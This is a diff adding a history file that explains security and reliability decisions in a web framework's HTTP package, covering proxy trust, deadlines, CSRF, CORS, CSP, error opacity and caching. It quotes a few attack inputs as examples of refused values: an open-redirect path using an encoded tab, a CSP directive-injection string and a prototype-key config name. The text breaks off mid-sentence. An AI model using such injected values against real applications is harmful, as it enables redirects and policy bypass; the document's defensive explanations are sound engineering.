@@ -1,0 +1,758 @@
+# @ultimat3/http — history
+
+The reasoning moved out of [`packages/http/CLAUDE.md`](../../packages/http/CLAUDE.md) (plan 101,
+slice 17 f, `As of 2026-09-23`), verbatim and under its original headings. A record of why, never
+a current fact: the rules that still hold are in that file, and where the two disagree it wins.
+
+## Boundary
+
+- May import: `@ultimat3/core`, `@ultimat3/schema`, `@ultimat3/i18n`, `@ultimat3/time` — tiers 0
+  and 1, which is the whole rule. There is no extra restriction here; the line used to read
+  "core, schema. Nothing else, ever", stated no reason, and was stricter than the tier table.
+  **What it bought was three re-implementations.** `locale.ts` carried its own `negotiateLocale`,
+  `isValidTimeZone` and `resolveTimeZone`, and each disagreed with its owner about the same
+  request: an app shipping `{ en, fr }` resolved `ctx.locale` to `'en'` forever, a switcher writing
+  the documented `LOCALE_COOKIE` (`x_locale`) was read by nothing because this package spelled it
+  `x-locale`, and `x-timezone: +01:00` — a fixed offset with no DST rules — became `ctx.tz` and
+  threw four packages later. Adding a tier-1 import is cheaper than a fourth divergence.
+
+- `@ultimat3/action` (tier 3) is what wires policy into `hooks.authorize`.
+
+
+## Rules
+
+- **Every numeric knob `defineHttpConfig` resolves is screened, `As of 2026-08-26`** — `port`,
+  `bodyLimitBytes`, `requestTimeoutMs`, `maxInflight`, `drainTimeoutMs` and `trustedProxyHops`,
+  each a whole number in its own domain or `X_CONFIG_INVALID` (core's code, borrowed as
+  `@ultimat3/auth` borrows it). Measured with `NaN`, which is what `Number(process.env.…)` answers
+  for an unset variable: `total > NaN` is false so the body cap stopped capping and the whole
+  payload was buffered; `NaN <= 0` is false so a deadline armed and `setTimeout(fn, NaN)` is 1ms,
+  which 504s every request; `ceiling > 0` is false so `admit` shed nothing; and
+  `Math.max(0, Math.floor(NaN))` is `NaN`, so `trustProxy: true` silently trusted no hop and every
+  caller's ip became the proxy's. `Math.max(0, …)` was the guard for the last of those — a clamp is
+  not a validator, and this package relied on one. `webhook-verify.ts` screens its own two
+  (`toleranceMs`, `maxBytes`) and `rate-limit.ts` its `maxKeys`; the helper names carry `Finite`
+  (`assertFiniteCount`, `assertFiniteKeyCap`, `assertFiniteBodyLimit`) because
+  `bun run finite-bounds` recognises a repair by the shape of the CALL — spelled `count`, all five
+  config options read as unchecked to the ratchet while every one was screened. `maxBytes` is
+  refused HERE as well as inside `readWithinLimit`: that one is a file away and its `fix:` names
+  core's reader rather than the option the caller wrote.
+
+  **The FLOOR is per option, because only the caller knows what zero means** (`As of 2026-08-26`).
+  `requestTimeoutMs: 0` is "no deadline" and `maxInflight: 0` is "never shed" — decisions the code
+  reads — so those two floor at 0; `trustedProxyHops` floors at **1**, and it shipped for one day
+  screened at 0. `forwardedElement` answers `undefined` for `hops < 1`, so
+  `{ trustProxy: true, trustedProxyHops: 0 }` was byte-for-byte the failure the screen's own comment
+  names: `clientAddress` falls back to the socket, one rate-limit bucket for everything behind the
+  ingress, `x-forwarded-proto` untrusted and HSTS never emitted. `-1` and `NaN` were refused for
+  producing exactly that state and `0` was accepted into it. `resolveTrustedProxyHops` owns both
+  refusals — unset is `X_TRUST_PROXY_UNSET`, out of domain is `X_CONFIG_INVALID` — and there is no
+  `?? 0` behind it, because a default of zero reopens the same hole from the other side.
+
+  **`MAX_PROXY_HOPS` is EXPORTED, `As of 2026-08-26`**, and that is the point of it. It was module
+  private, so `@ultimat3/cli`'s `trustedHopsFromEnv` — which screens the same setting arriving as
+  `TRUSTED_PROXY_HOPS` — restated the literal, and one setting came to have two ceilings: that end
+  said 16 while this one said 64, so a deployment behind 20 hops was accepted by the library and
+  refused at boot. `cli` is tier 5 and this is tier 2, so the import is downward and legal. The
+  number lives here because this is where the setting is.
+
+- **An app declares its half of `HttpConfig` through `configureHttp()`, and the boot lays its own
+  facts over it** (`As of 2026-08-24`). Until 12.0.0 the entire tuning surface was **unreachable
+  from a shipped app**: `AppConfig` has never had an `http` key, `RuntimeOverrides` carries none,
+  and the only construction any shipped process made was one fixed literal in
+  `packages/cli/src/dev-roles.ts` passing eight boot facts — so `DEFAULT_CORS.origins` was `[]` in
+  every deployment (an SPA on `app.example.com` calling `api.example.com` could not work, ever),
+  `bodyLimitBytes` was 1 MiB for a 4 MB CSV endpoint, `requestTimeoutMs` 30s for a five-minute
+  export, and `rateLimit.buckets` was 120 burst / 2 rps for a bank and a blog alike. Fourteen
+  `fix:` lines told the reader to edit `http.<key>` in `app.config.ts`, which has never held one.
+  It is a registration and not a config key for `configureAuthenticator`'s reason, stated in
+  `hooks.ts`: `@ultimat3/core` is tier 0 and cannot hold this package's types, so an `http` block
+  on `AppConfig` would be a **second declaration** of `HttpConfigInput` in a package that can
+  never check it against this one. `AppHttpConfig` is `Omit<HttpConfigInput, BootOwnedHttpKey>`,
+  **derived, never listed**: a key the boot always overwrites (`port`, `hostname`, `dev`,
+  `buildId`, `signInPath`, `trustProxy`, `trustedProxyHops`, `rateLimit.scope`) is a type error
+  where an app writes it, rather than a value silently discarded at every boot. `mergeHttpConfig`
+  merges one level down — `security.csp.extend` per DIRECTIVE, because the app's CDN source and
+  the boot's inline-script hash are each the whole answer for something, and either alone breaks a
+  page. `type-pins.ts` holds the other half: a key on `HttpConfig` and not on `HttpConfigInput` is
+  a build error, which `scripts/config-readers.ts` cannot see — that ratchet walks `AppConfig` and
+  asks whether a key is READ, and this is the mirror question.
+
+- **`asCtx` is a WIDENING the compiler checks, never a cast.** `RequestContext extends Ctx` and
+  `asCtx` is the identity function. It used to be `ctx as unknown as Ctx` over an object that set
+  none of `clock`, `now`, `logger`, `signal` or `services` — so `ctx.now()` threw
+  `TypeError: ctx.now is not a function` on every audited action served over HTTP,
+  `useService()` threw a `TypeError` instead of the `X_SERVICE_MISSING` it exists to raise, and
+  `throwIfAborted()` — the documented cancellation seam — was inert on the one surface where a
+  caller can actually go away. Never reintroduce the assertion: the type error IS the enforcement,
+  and it is a type-pin rather than a `.test.ts` because `tsconfig.json` excludes tests.
+  `ctx.buildId` is core's meaning — the build this PROCESS serves; the CLIENT's claim is
+  `ctx.clientBuildId`, read only by `assertBuild()`.
+
+  **`RequestContext extends Ctx` again, and this file no longer BUILDS a context — it composes
+  one** (`As of 2026-08-24`). `Ctx extends CtxServices`, and `CtxServices` is the seam an app
+  augments (`declare module '@ultimat3/core'`) to declare `ctx.posts` — so in an APP's program
+  every service it declared became a REQUIRED member of `createRequestContext`'s object literal,
+  and this file failed to compile inside `examples/dummy` with `TS2739: missing posts, orgs` while
+  the framework's own gate, which augments nothing, stayed green. The framework cannot set members
+  only the app's boot knows about.
+
+  `createRequestContext` now spreads `createContext()`'s result. Those members arrive WITH the
+  base, so the literal is checked in full and there is **no assertion left in this file** —
+  `withServices`, which existed for one release, is gone. `packages/core/src/context.ts` keeps the
+  framework's one irreducible `as Ctx` and its header states, with the four measured alternatives,
+  why it cannot be removed below a major.
+
+  Composing is also one constructor for one shape instead of two. This file used to re-derive
+  `clock`, `now`, the logger child, `signal`, `deadlineAt` and the service bag, so core could fix
+  any of them and this surface would keep the old answer — which is exactly what happened to the
+  bag (see the bullet below). `defineService` factories now install here too, for the same reason:
+  they are `createContext`'s, and this is `createContext`.
+
+  `type-pins.ts` carries `_RequestContextIsACtx`, because `asCtx` is a function body and a future
+  edit answering a failure there with a cast would delete the enforcement and leave the comment.
+  The reverse direction is FALSE by design — core's `Ctx` carries no `requestHeaders`, which is
+  what `assertInRequest` proves one way at runtime.
+
+- **`defineService` used to be a job-and-CLI feature, and nothing said so** (`As of 2026-08-24`).
+  Two halves, and together they made services unreachable on the surface an app spends its life
+  on. This file built its own service bag from `RequestContextInit.services` alone and never
+  called core's `installedServices()`; `pipeline.ts:224` passes NO `services` at all. So a
+  `defineService('posts', …)` an app registered at boot was installed for a job, a task and a CLI
+  command and for nothing else — over HTTP `ctx.services` was `{}` and `useService('posts')` threw
+  `X_SERVICE_MISSING`. And the bag, even when one was passed, was never spread ONTO the context,
+  so `ctx.posts` — the spelling `docs/architecture/15-adding-a-feature.md` writes in its worked
+  example — read `undefined` beside a populated `ctx.services`.
+
+  Composing `createContext` fixes both at once, which is the argument for composing: the installer
+  is core's and so is the spread. Services go on FIRST so a service an app named `actor` or
+  `logger` loses to the request's own field and stays reachable as `ctx.services['actor']`; the
+  context's meaning never depends on what an app named a service. `context.test.ts` pins the
+  factory install, the spread and the collision order.
+
+- **A member's saved locale and zone apply, re-resolved after `auth`** (21.0.0). The `locale`
+  stage runs before `auth`, so it resolved from the cookie and `Accept-Language` alone and the
+  `user` rung of `resolveLocale` / `resolveTimeZone` was filled by nothing since 2.0.0. Core's
+  `Actor` now carries `locale?` / `tz?` (the saved preferences, set by whoever authenticates), and
+  the `auth` stage re-runs `resolvePreferences` when either is present — the owners' order, so a
+  locale cookie still beats a saved locale and a saved zone beats the cookie. `member-preferences.test.ts`.
+
+- **A request's registered services are LAZY and bound to the actor that authenticated**
+  (`request-services.ts`, 21.0.0). The context is built before the `auth` stage names anyone, and
+  core's constructor built every `defineService` factory right there — so every service acted as
+  the anonymous actor for the whole request while `ctx.actor` read the real one: the reference
+  app's like answered 500 `X_ORG_NOT_A_MEMBER` for a member. `createRequestContext` passes core
+  `installServices: false` and `bindRequestServices` turns `ctx.services` and each registered
+  `ctx.<name>` into getters: built on first read, rebuilt only if the actor, locale or tz it closed
+  over changed. One build for a handler; a hook that reads a service before auth gets its own.
+  `request-services.test.ts` drives the real pipeline. Pre-existing since 13.0.0.
+
+- **The two inbound ids are read BEFORE the context and the span, in `correlation.ts`.** `startSpan`
+  resolves its parent from `currentSpanContext()`, which reads `ctx.traceId`, so a `traceparent`
+  parsed by a stage arrived one frame after the span's context was already frozen: the caller's
+  trace was discarded, the root span carried a dashed UUIDv7 no collector accepts as a trace id,
+  and the log lines beside it quoted a third value. The `request-id` and `trace` stages now only
+  PUBLISH what was decided — they do not decide. The regex is core's `parseTraceparent`, one copy.
+  **Only ONE of the two is gated on `trustProxy`, and the asymmetry is deliberate** — `x-request-id`
+  is ECHOED back as this response's identity, so a caller choosing it poisons log correlation for
+  everyone; `traceparent` is W3C context continuation, which any caller is expected to send.
+  `traceHeaders()` (tier 0) puts it on every typed-client call, so gating it would break tracing
+  between two Ultimate services under the default `trustProxy` (false), for a value that carries
+  correlation and no authority. Never "fix" the inconsistency by gating it.
+
+- **Every proxy-supplied header goes through `forwardedElement(header, hops)` and nothing else.**
+  `trustProxy` documented reading `x-forwarded-for` and had no reader at all, so behind any ingress
+  every anonymous request keyed to the proxy — one `auth` bucket (capacity 10) for the whole
+  internet, and one scanner enough to 429 every signup on the fleet. The entry read is
+  `entries.length - hops`, never `[0]`, which is whatever the client typed; a chain shorter than
+  declared trusts nothing rather than falling back leftward. `trustProxy` defaults to **false** and
+  requires `trustedProxyHops` (`X_TRUST_PROXY_UNSET` at `defineHttpConfig`) — it also gates the
+  `x-request-id` echo, and a direct caller choosing its own request id poisons log correlation.
+  The inbound `traceparent` is deliberately NOT on this list; `correlation.ts` above says why.
+  `x-forwarded-proto` rides the same rule, which is what finally emits HSTS behind a
+  TLS-terminating ingress, and so does Envoy's `x-forwarded-client-cert` (`peer-identity.ts`).
+  **A peer certificate read from an untrusted hop is worse than none, because it authenticates** —
+  so `ctx.peer` is `null` for an untrusted deployment, a missing header and a short chain alike.
+  `ctx.peer` is never an actor: `hooks.authenticate` is the one funnel, through
+  `verifyWorkloadToken()` -> `actorFromService()` in `@ultimat3/auth`.
+
+- **One deadline per request, and it is what makes `ctx.signal` exist.** `deadline.ts` holds the
+  `AbortController` and the timer; `config.requestTimeoutMs` (30s, `0` disables) is the budget and
+  a caller may SHORTEN it with `x-request-timeout-ms`, never lengthen it. Two halves, both needed:
+  the abort is what cooperative code unwinds on, and the race in `execute` is what answers the
+  socket when a handler never looked at the signal. `X_TIMEOUT` is borrowed (core's concept) and
+  already mapped to 504. **`ctx.signal` is the deadline OR the caller going away**, `As of
+  2026-08`: `pipeline.ts` hands `startDeadline` the inbound `Request.signal` and the two are joined
+  with `AbortSignal.any`, which is what `context.ts` had documented and nothing wired — a closed
+  tab held its handler, its pool slot and its vendor connection for the whole 30s. `expired` stays
+  the timer's alone: it answers the SOCKET, and a caller that hung up has no socket to answer.
+  **And it leaves this process on the next hop's headers, `As of 2026-08-24`**:
+  `Deadline.deadlineAt` is published as core's `ctx.deadlineAt`, and `traceHeaders()` (tier 0, the
+  one thing both typed clients spread before the caller's own headers) sends what is LEFT as
+  `x-request-timeout-ms`. Before that the header had exactly one reader — `resolveTimeoutMs`, in
+  this file — and **zero writers anywhere in the tree**, so gateway → A (30s) → B meant a call made
+  at t=29 started B on a FRESH 30s: real work, holding a pool slot and a vendor connection, half a
+  minute after A's socket was answered `X_TIMEOUT`. A spent budget sends no header at all rather
+  than `0`, because `resolveTimeoutMs` ignores anything under 1ms and falls back to its own.
+  With `requestTimeoutMs: 0` the caller's signal is handed through as-is rather than the shared
+  never-aborted singleton, which every such request used to share — one `abort` listener per
+  request, accumulating for the life of the process. Always `deadline.clear()` in the `finally` —
+  a live timer keeps the event loop from going idle, so a process that answered everything still
+  refuses to exit.
+
+- **`admit` is the second stage, and it refuses before ANY work.** `isDraining()` had no reader in
+  this package while this file claimed the layer answered 503 on it; past `config.maxInflight`
+  (1000, `0` disables) a request is shed `X_OVERLOADED` with `retry-after`. Both set the header on
+  `ctx.headers`, which the `response` stage merges, rather than teaching `error-map` a second
+  special case. The in-flight number is core's `inflightCount()` — the same counter `beginWork()`
+  in `server.ts` maintains — never a private one, for the same reason the drain phase is core's.
+  A refusal that costs as much as a served request is not load shedding.
+  **A DRAINING process serves, `As of 2026-09-23`** — it sets `connection: close` and lets the
+  request through; only `lifecycleState() === 'stopped'` answers `X_DRAINING`. Refusing on
+  `isDraining()` made the readiness grace useless: a kept-alive connection keeps delivering
+  requests after `/readyz` flips, and every one got a 503 (598 of 7,690 on a kind helm upgrade).
+  Do not move the refusal back to `isDraining()`; `pipeline-hardening.test.ts` pins both halves.
+
+- **`csrf` sits after `auth` and before `body`, and CORS cannot replace it.**
+  `application/x-www-form-urlencoded` is a CORS-*simple* content type, so a cross-site
+  `<form method="post">` is SENT and EXECUTED with the session cookie attached and
+  `cors.origins: []` only withholds the reply — long after the refund went through. After auth
+  because only an AMBIENT credential can be forged into (anonymous and bearer callers are exempt);
+  before body so a rejected write never allocates its payload. `sec-fetch-site: same-origin`, an
+  `Origin` equal to this app, or an `Origin` already in `cors.origins`; anything else is
+  `X_CSRF_BLOCKED` (403, never 401 — the caller IS signed in, which is the problem). "Already in
+  `cors.origins`" means an EXACT listing — `originListed`, never `allowedOrigin`, `As of
+  2026-09-06`. That one answers the RESPONSE header, and for `origins: ['*'], credentials: false`
+  (the only wildcard `assertCorsConfig` admits) its answer is `'*'`, which is not `null` and so
+  read as "this origin is one we allow": every origin on the internet was same-origin, and the
+  cross-site form post this stage exists to refuse was answered `{"ok":true}`. The self
+  origin is built from `ctx.https`, not `url.protocol`, or every legitimate post behind a
+  TLS-terminating ingress would be refused. **`mode: 'token'` is deliberately NOT shipped** — a
+  double-submit token needs a cookie issuer and a form-field helper at tier 4/5, and a half-built
+  token mode is worse than an honest `'origin' | 'off'`.
+
+- **An unclassified 5xx tells the CALLER nothing off the throwable** (`As of 2026-08-23`).
+  `error-page.ts` has always shown a browser the status, the code and the request id and said so in
+  its header; `toProblem` rendered `facts.cause`, which for a 500 nobody classified falls through to
+  the exception's own `message` — a driver's DSN, the row Postgres rejected, an absolute path. One
+  condition, two audiences, and they disagreed. The discriminator is a code nobody declared a status
+  for, plus `X_INTERNAL` itself: core's `toError()` wraps a caught value into an `InternalError`
+  whose cause is `renderCauseValue(value)`, so the framework's own word for "unclassified" is where
+  the leak arrives. `toProblem(error, { dev })` is the seam and `dev` DEFAULTS TO FALSE: the
+  `error-map` stage is the one call site that can see the config, and every degraded `problem()` in
+  the tail must stay opaque. The real text is not lost — it is the log field and the error report,
+  both keyed by the request id the caller was given.
+
+- **The problem document carries the ISSUE LIST, and the opacity rule applies to it**
+  (`As of 2026-08-24`). `ProblemDocument.issues` is a top-level extension member — RFC 9457 §3.2
+  puts extension members at the document root and every Ultimate extension already is one
+  (`code`, `cause`, `fix`, `docs`, `requestId`); there is no bag. `@ultimat3/action` has attached
+  the list to `meta.issues` since `InputInvalidError` grew its third parameter and **nothing
+  carried it**, so every app in this framework recovered per-field form errors by splitting
+  `cause` on `'; '` — guesswork the moment a message contains the separator.
+
+  Four rules, and the third is the one most likely to be dropped by a later edit.
+  `issuesOf` is TOTAL and module-private, written in `retryAfterOf`'s shape and for its reason:
+  `meta` is a property read on a value this package did not build, in the frame that decides what
+  the caller sees. It is **all-or-nothing** — a client that finds `issues` uses it INSTEAD of
+  `cause`, so one unreadable entry drops the whole list back to the prose line rather than
+  shipping a subset, which would be a rejection the user never sees and a form reporting itself
+  valid. The member is **absent** when there is none, never `undefined` and never `[]`:
+  `JSON.stringify` drops an `undefined`, but this interface is read directly by `error-page.ts`
+  and by tests, and `[]` claims "validated clean" about a request that was just refused — which
+  the first implementation of this reader emitted, because `Array.isArray([])` is true and the
+  loop simply does not run. A list past `MAX_PROBLEM_ISSUES` (100) is dropped WHOLE for the same
+  all-or-nothing reason, and because `@ultimat3/action`'s `issuesFromWire` bounds it identically
+  on arrival: sending it is a body that costs the wire and answers nothing. That package is tier 3,
+  so the number is restated here and pinned on this side. And it is **dropped under exactly the condition
+  that blanks `title`/`detail`/`cause`** — an issue list on an unclassified 5xx is precisely the
+  internal detail `INTERNAL_CAUSE` exists to withhold, because it names the fields and the
+  expectations of something the caller was never meant to see inside. `X_INPUT_INVALID` is a
+  declared 4xx and so is never opaque.
+
+  `received` is forced to `''` and every entry is rebuilt member by member, never spread. Not
+  redundancy with `toValidationIssues`, which forces the same thing: this is the boundary where
+  the value LEAVES the process, a conforming library's own issue object is first-class here and
+  routinely carries the rejected value, and `@ultimat3/schema`'s `describeValue` exists because a
+  password-strength rule once wrote mistyped passwords into the log index.
+
+- **A rejected value is a log FIELD, never part of the message.** `logger.emit()` redacts `bound`,
+  `contextFields` and `fields` — and never `msg` — so `logger.error(\`${code}: ${cause}\`)` in the
+  `error-map` stage wrote a rejected password verbatim into the log store, at 4xx, which is logged
+  and not reported and therefore kept for the full retention. The message is the CODE alone. The
+  other half is `@ultimat3/schema`'s `describeValue` (shape, never content) and it is the
+  load-bearing one; this half is what makes the value redactable at all.
+
+- **A repeated field is a LIST, in all three parsers.** `collectFields` in `request.ts` is the one
+  collector for the query, `application/x-www-form-urlencoded` and `multipart/form-data`. The last
+  two were `Object.fromEntries`, which keeps the LAST value: a checkbox group posting `tags` three
+  times reached the body schema as one string, while the query parser three functions up had built
+  an array for the same shape since it shipped.
+
+- **A rejected BODY is not a log field either — `bodyInvalid`'s `issues` may name only what the
+  framework chose** (`As of 2026-08-19`). `request.ts` built `could not parse ${type}: ${String(error)}`,
+  and the runtime's `SyntaxError` quotes the token it choked on: a `POST` of
+  `{"password": hunter2SuperSecret}` answered `422` with that identifier in `cause`, which goes to
+  the CALLER through `toProblem` and to the log store as the unredactable field `cause`. Two rules,
+  both needed. The caller-facing `issues` are a fixed vocabulary — `could not parse the body as
+  JSON`, and the LIST of accepted content-types rather than the one that was sent — and everything
+  the caller supplied rides in `bodyInvalid`'s third argument, `meta`, which `toProblem` never
+  renders for a framework code (`registerProblemMeta` refuses to declare one). The parser's own message goes through core's `renderThrowable`, never `String(error)`:
+  `bun run error-render` cannot see this class of defect, because a `catch` binding is not a
+  parameter, so it is a review rule here and a blind spot there.
+
+- **`meta` reaches the document only by declaration — per code, per key, app codes only**
+  (`As of 2026-09-05`). `meta` is the operator-only bag: `bodyInvalid` keeps the body excerpt
+  there, the limiter its internal key, core's `assert` the rejected value, `env-example.ts` file
+  paths, and each of those relies on `toProblem` never rendering it. So "carry `meta`" was never
+  an option, and an app whose `X_SESSION_CHECKOUT_BUSY` put `{ sessionId, title, state }` there
+  had its island recover the id by running a UUID regex over `cause`. `registerProblemMeta({
+  X_SESSION_CHECKOUT_BUSY: ['sessionId', 'title', 'state'] })` (`problem-meta.ts`) is the seam,
+  in `registerErrorStatus`'s shape and refusing what it refuses — a framework-owned code —
+  plus `issues` (one home, one bound) and `__proto__`. `wireMeta` copies the declared keys that
+  are set, member by member through `Object.defineProperty`, all-or-nothing for `issuesOf`'s
+  reason and bounded at `MAX_PROBLEM_META_BYTES`; `toProblem` drops it under exactly the
+  `opaque` condition that blanks `cause`, which is also the belt on "both registrations are
+  needed": a code with keys and no status is unclassified. The typed client
+  (`@ultimat3/action`'s `metaFromWire`) puts the member back on `RemoteActionError.meta`, under
+  the four members that class owns.
+
+- **A browser that fails `auth: 'required'` is redirected; an agent gets the problem document.**
+  One condition, two audiences, decided once in `auth-redirect.ts` and applied in the `error-map`
+  stage before the overlay. `config.signInPath` is `null` until an app names its page, because a
+  framework that guessed `/signin` would send an app spelling it `/login` to a 404 — strictly
+  worse than the JSON. The round trip is `?next=`, and `nextAfterSignIn` is the ONE reader of it:
+  anything that is not a same-origin path falls back, or the page that hands out a session
+  becomes an open redirect. **A control character is an off-site destination**: a browser deletes
+  TAB, CR and LF from a `Location` before parsing it, so `/%09/evil.test` decodes to a value that
+  starts with one slash, passes a prefix check and is then followed as `//evil.test`. The prefix
+  checks are not the last word — the value is re-parsed against an origin no relative path can
+  reach, and anything that resolves off it falls back. Nothing here throws either: `?next=%` is a
+  bare `URIError`, and this runs while the pipeline is already rendering a 401.
+
+- **The body cap is enforced while reading, never after.** `UltimateRequest.#read` pulls the body
+  through a counting reader and cancels the stream the moment the running total passes
+  `bodyLimitBytes`. `content-length` is a courtesy — a `transfer-encoding: chunked` request
+  declares none, so `arrayBuffer()` allocated a 10GB payload in full before measuring it. Multipart
+  goes through the same capped bytes (re-parsed by `Response.formData()` off the announced
+  boundary) rather than being handed to the runtime as an unbounded stream, which is what left it
+  with no byte guard at all when the length was undeclared.
+
+- **The `cache-headers` stage is the ONE owner of the final cache answer, `As of 2026-08-23`.** It
+  used to apply the actor-aware default only when nothing had set a header — and every page route
+  in every app sets one, because `@ultimat3/render`'s `ssrHeaders` writes
+  `public, max-age=0, s-maxage=30, stale-while-revalidate=300` for any route that declares no
+  `policy`, which is exactly what `x g route --surface app` scaffolds. So the rule below was
+  unreachable for the surface it was written for. A render mode states the MODE's intent; this
+  stage decides, and `offersSharedCache` is the discriminator: a shared answer for an identified
+  request becomes `PRIVATE_CACHE`, an anonymous one gains `SHARED_CACHE_VARY`. `immutable` is left
+  alone in both directions — it asserts the body is a function of the URL, which is what a
+  content-addressed island chunk is, and demoting those would re-download every chunk on every
+  navigation for every signed-in user.
+
+- **The cache default reads the ACTOR, not just the route, and `vary` is added and never set.**
+  `meta.auth` is only `'public' | 'required'`, so the page that greets a signed-in visitor by name
+  is a `'public'` route: keying the default off the route alone put that visitor's personalised
+  HTML in a shared cache for 60 seconds. A request whose actor is not anonymous is `private`;
+  an anonymous one stays shared-cacheable and carries `vary: accept-language, cookie`. Both halves
+  are required — either alone leaves the hole. `addVary` (`response.ts`) is how the `response`
+  stage merges CORS's `vary: origin` into the cache stage's key instead of replacing it.
+
+- **A `security.csp.extend` entry is refused at `defineHttpConfig` unless it can only emit the
+  directive it names.** A directive name and a source both go into the header VERBATIM and the
+  header's own separators are `;` and ` `, so `extend: { 'x; script-src *': [] }` was not one badly
+  named directive — it was a second directive nobody declared, widening the one this package locks
+  down hardest. `X_CSP_DIRECTIVE_INVALID`, at boot, because there is no encoding for a CSP source
+  and escaping one at emission time is not a repair. `buildCsp` builds through a **`Map`** for the
+  other half of the same class: `directives[name]` was a computed read of an object literal keyed by
+  a caller-chosen name, so `extend: { toString: [...] }` spread a function off `Object.prototype`
+  and threw a bare `TypeError` at boot. `proto-index` cannot see it — `baseline()` is what produces
+  the object.
+
+- **`config.drainTimeoutMs` is `number | null`, and `null` is the default** (`As of 2026-08-23`).
+  `createServer` calls `configureLifecycle({ deadlineMs })` only when an app DECLARED one. It used
+  to call it unconditionally with a value `defineHttpConfig` had defaulted to 15s, so an app that
+  wrote `configureLifecycle({ deadlineMs: 600_000 })` — the edit `X_SHUTDOWN_TIMEOUT`'s own `fix:`
+  prints — had it silently reverted by the next line of boot, in every process that serves web.
+  "Nobody said" and "the app said 15 seconds" are different claims and only one of them may move a
+  process-global deadline.
+
+- **`cors.origins: ['*']` with `credentials: true` is refused at `defineHttpConfig`.** No browser
+  accepts that pair, and `allowedOrigin` answering `null` for it meant the natural "open it up"
+  edit emitted no CORS headers at all, silently, on every request — with `DEFAULT_CORS.credentials`
+  (true) as the half nobody thinks to look at. `X_CORS_CONFIG_INVALID`, at config time, with the
+  one-line edit in the `fix`. A REFUSED origin still gets `vary: origin`: without it a shared cache
+  files the un-CORS'd body under the URL alone and hands it to an allowed origin next.
+
+- **HSTS is emitted only when https is affirmed.** `securityHeaders(config, { https })` defaults to
+  NOT sending it — the pipeline is the one caller that knows, and it passes `ctx.https`. The guard
+  read `!== false`, so every other caller sent a two-year `includeSubDomains` for a connection
+  nothing had established was secure, which is the opposite of what the comment above it promised.
+
+- **`meta.enforcedBy` says who evaluates `meta.policy`, and the `authz` stage obeys it.**
+  `'pipeline'` (the default, and what a page wants) means the stage decides through
+  `hooks.authorize`; `'handler'` means the handler is the one evaluation and the stage returns
+  without deciding — no hook required, and none consulted. An action route says `'handler'`
+  because `@ultimat3/action`'s `invoke` loads the row a row-level rule reads and this stage
+  cannot. Deciding in both places is two authz systems, and the one that answers first is the
+  one holding less.
+
+- **A 403's `fix:` names the POLICY, never the pathname** (`As of 2026-08`). `forbidden` emitted
+  `x policy explain ${ctx.url.pathname}`, and `x policy explain` resolves a policy SUBJECT — a
+  permission, an action name or a query name. A page pathname is none of them, so the one command
+  the error told the reader to run exited `X_DECLARATION_UNKNOWN` (`x policy explain /settings`,
+  reproduced in `examples/dummy`). The third argument is `route.meta.policy`, which is what the
+  `authz` stage was evaluating and what the index can resolve; anything that is not a bare
+  `resource:verb` — a composite renders `and(a:b, c:d)` — degrades to `x routes --json`, the shape
+  `bodyInvalid` already uses. A fix that names the wrong thing is not a fix.
+
+- **`ctx.actor` is never null.** `asCtx` publishes the request context itself as core's `Ctx`,
+  and `Ctx.actor` is an `Actor` — so "nobody" is core's anonymous actor, not `null`. The
+  `authenticate` hook still says it with `null`; the `auth` stage is where that becomes
+  `anonymousActor()`. A null here reaches every `ctx.actor` reader in the framework as a contract
+  violation that only shows up on the first unauthenticated request.
+
+- **The lifecycle is three files, and the split is by responsibility, not by length.** `pipeline.ts`
+  owns the ORDER (`PIPELINE_STAGES`, the phases, the run loop, ALS, the span and the one metrics
+  call); `stages.ts` owns what each stage does and declares the vocabulary (`StageName`,
+  `StageRun`, `Stage`) beside the implementations it names; `finalize.ts` owns the promise that the
+  tail answers rather than rejects. Imports go one way — `pipeline.ts` → `stages.ts` — because a
+  stage body reads `StageRunnersInput`, an explicit list of what a stage may depend on, and never
+  `PipelineDeps`. Adding a stage means an entry in **both** `PIPELINE_STAGES` and the
+  `Record<StageName, StageRun>` table; the record type is what makes forgetting one a build error.
+
+- Never add a stage to `PIPELINE_STAGES` without a `why` and a test.
+
+- **The `locale` stage decides WHERE, the owners decide WHAT.** It reads a header and a cookie and
+  hands the raw strings to `@ultimat3/i18n`'s `resolveLocale` and `@ultimat3/time`'s
+  `resolveTimeZone`; it must never negotiate, validate or canonicalize one itself. The two answers
+  land on `ctx.locale` and `ctx.tz` — **core's own declared fields, the framework's only ambient
+  store for either** — so `currentLocale()` and `currentTimeZone()` answer for this request once
+  `pipeline.ts` publishes the context into the ALS. `@ultimat3/time` kept a second store
+  (`ctx['timeZone']`) with zero writers until 1.3.0, and the whole cost was silent: every
+  `@ultimat3/ui` server render formatted its dates in UTC however the request arrived. A default
+  for either value is `configureTime({ defaultZone })` / `defineCatalogs({ default })`, never a
+  third copy in `HttpConfig`.
+
+- **`toBucket` lives here, not in `@ultimat3/action`.** `action` and `query` are the same tier and
+  can never import each other, so the only conversion between `{ limit, windowMs }` and a `Bucket`
+  sitting in one of them is why a `query` could not declare a rate limit at all. It is beside
+  `Bucket` and the maths it validates, and it throws http's own `X_RATE_LIMIT_INVALID`.
+
+- **`ERROR_STATUS`'s keys are LITERAL, not an index signature** (`As of 2026-08-19`). The
+  annotation was `Readonly<Record<string, number>>`, which made `ERROR_STATUS.X_QUERY_NOT_PAGABLE`
+  a legal read answering `undefined` — a mistyped row in the one table the framework's whole error
+  contract rests on. It is now an object literal `satisfies Readonly<Record<string, number>>`, so a
+  typo is a compile error; `error-map.test.ts` pins that with a `@ts-expect-error`. Read it by a
+  code the framework did not mint through `statusFor()`, which goes via the file-local `BY_CODE`
+  view and keeps `Object.hasOwn`.
+
+- **A problem document's `type` and its `docs` are two different questions, `As of 2026-08-23`.**
+  Both used to be `https://ultimate.dev/errors/<code>` — one string, twice, and a host that
+  answers **404** on every 4xx and 5xx this package has ever rendered. `docs` is now core's
+  `ERROR_DOCS_URL`, one wiki page for every code, and it is never spelled here: a construction site
+  omits `docs:` and `UltimateError` resolves it. `type` did NOT follow it there. It is RFC 9457's
+  primary identifier for the problem KIND — a client switches on it — so collapsing it onto one
+  page would have given a 422 and a 403 the same identifier. `problemTypeFor(code)` answers
+  `urn:ultimate:error:<CODE>`: per code, stable, and a URN has no host to rot. `finalize.ts`'s
+  `lastResort` spells its one `type` as a literal because that function calls nothing, and
+  `pipeline-finalize.test.ts` pins the literal against `problemTypeFor('X_INTERNAL')` so the two
+  cannot drift. Never assert either value as a copied string — import the constant.
+
+- **`error-map.ts` answers the status; `error-facts.ts` renders the throwable** (`As of
+  2026-08-24`). One file did both and reached 501 lines, over the ceiling. The seam between
